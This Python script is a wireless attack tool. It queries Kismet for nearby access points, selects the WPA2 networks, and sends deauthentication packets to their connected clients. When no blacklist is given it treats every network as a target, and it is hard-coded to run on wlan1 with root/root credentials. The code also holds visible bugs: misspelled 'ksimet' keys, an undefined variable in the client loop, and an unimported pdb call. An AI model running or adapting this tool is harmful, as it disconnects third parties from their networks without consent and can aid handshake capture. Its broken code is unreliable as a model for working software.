import kismet_rest
import deauthenticator
import logging
import time

class Devices():
    device = None
    iface = None
    white_mac = []
    white_ssid = []
    black_mac = []
    black_ssid = []

    def __init__(self, username: str, password: str, iface: str, num_deauth_packets: int, white_mac: list = [], white_ssid: list = [], black_mac: list = [], black_ssid: list = []):
        self.device = kismet_rest.Devices()
        self.iface = iface
        self.num_deauth_packets = num_deauth_packets
        self.white_mac = white_mac
        self.white_ssid = white_ssid
        self.black_mac = black_mac
        self.black_ssid = black_ssid
        self.device.set_login(username, password)

    def is_whitelisted(self, device, device_type):
        """Return true if the device is found in a white list. Otherwise return false. Return false if no whitelist"""
        if self.white_mac == [] and self.white_ssid == []:
            return False

        if device['kismet.device.base.macaddr'] in self.white_mac:
            return True

        if device_type == "access point":
            if device['ksimet.device.base.name'] in self.white_ssid:
                return True
            
            elif device['kismet.device.base.commonname'] in self.white_ssid:
                return True
            
        return False

    def is_blacklisted(self, device, device_type):
        """Return true if the device is found in a black list. Otherwise return false. Return false if no blacklist (everything is a target)"""
        if self.black_mac == [] and self.black_ssid == []:
            return True

        if device['kismet.device.base.macaddr'] in self.black_mac:
            return True

        if device_type == "access point":
            if device['ksimet.device.base.name'] in self.black_ssid:
                return True
            
            elif device['kismet.device.base.commonname'] in self.black_ssid:
                return True
            
        return False


    def get_access_points(self):
        access_points = self.device.dot11_access_points()
        for ap in access_points:
            logging.debug(f"Access point: MAC: {ap['kismet.device.base.macaddr']} SSID: {ap['kismet.device.base.name']}, frequency: {ap['kismet.device.base.frequency']}, encryption: {ap['kismet.device.base.crypt']}")

            if self.is_whitelisted(ap, "access point"):
                logging.info(f"{ap['kismet.device.base.macaddr']} is a whitelisted access point")
                continue

            if not self.is_blacklisted(ap, "access point"):
                logging.info(f"{ap['kismet.device.base.macaddr']} is not a blacklisted access point")
                continue

            if "WPA2" in ap['kismet.device.base.crypt']:
                logging.info(f"Found WPA2 device! MAC: {ap['kismet.device.base.macaddr']} SSID: {ap['kismet.device.base.name']}")
                self.clients(ap)

    def clients(self, access_point):
        ap_mac_addr = access_point['kismet.device.base.macaddr']

        logging.debug(f"Iterating over clients for: MAC {access_point['kismet.device.base.macaddr']}, SSID: {access_point['kismet.device.base.name']}")

        for client in self.device.dot11_clients_of(access_point['kismet.device.base.key']):
            logging.debug(f"Client: MAC: {client['kismet.device.base.name']}, Name: {client['kismet.device.base.name']},  Frequency: {client['kismet.device.base.frequency']}")
            if self.is_whitelisted(client, "client"):
                logging.info(f"{ap['kismet.device.base.macaddr']} is a whitelisted client")
                continue

            if not self.is_blacklisted(client, "client"):
                logging.info(f"{ap['kismet.device.base.macaddr']} is not a blacklisted client")
                continue

            client_mac = client['kismet.device.base.macaddr']
            time.sleep(0.2)
            resp = deauthenticator.deauth(self.iface, self.num_deauth_packets, ap_mac_addr, client_mac)
            print(client)


    def devices(self):
        for device in self.device.all():
            pdb.set_trace()

if __name__ == "__main__":
    devices = Devices("root", "root", "wlan1", 1)
    devices.get_access_points()
